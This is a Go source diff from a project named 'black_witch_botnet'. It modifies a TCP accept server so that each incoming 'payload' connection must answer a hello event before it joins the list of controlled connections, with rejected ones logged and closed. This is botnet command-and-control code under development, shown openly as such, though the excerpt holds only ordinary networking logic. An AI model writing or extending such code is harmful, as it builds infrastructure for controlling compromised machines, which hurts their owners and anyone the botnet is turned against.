@@ -1,6 +1,7 @@
 package server
 
 import (
+	"black_witch_botnet/relations"
 	"crypto/tls"
 	"fmt"
 	"log"
@@ -80,7 +81,7 @@ func (s *AcceptServer) accept(l net.Listener, r *Runner) {
 		conn, err := l.Accept()
 
 		if err != nil {
-			fmt.Println("[TCP] Accept connection", err)
+			log.Println("[TCP] Accept connection", err)
 			continue
 		}
 
@@ -89,8 +90,28 @@ func (s *AcceptServer) accept(l net.Listener, r *Runner) {
 			Conn: conn,
 		}
 
-		r.Payloads = append(r.Payloads, p)
+		req := &relations.EventMessage{
+			Type: relations.EventTypeHello,
+		}
 
-		fmt.Printf("[*] New connection %s. Total connections: %d\n", p.Addr, len(r.Payloads))
+		res, err := p.handle(req)
+
+		if err != nil {
+			log.Println("[TCP] Handle hello", err)
+			continue
+		}
+
+		e, ok := res.(*relations.EventResult)
+		if !ok || !e.Status {
+			o := dump(res)
+			log.Printf("[*] Reject connection %s\n", p.Addr)
+			log.Println(o)
+
+			conn.Close()
+			continue
+		}
+
+		r.Payloads = append(r.Payloads, p)
+		log.Printf("[*] New connection %s. Total connections: %d\n", p.Addr, len(r.Payloads))
 	}
 }
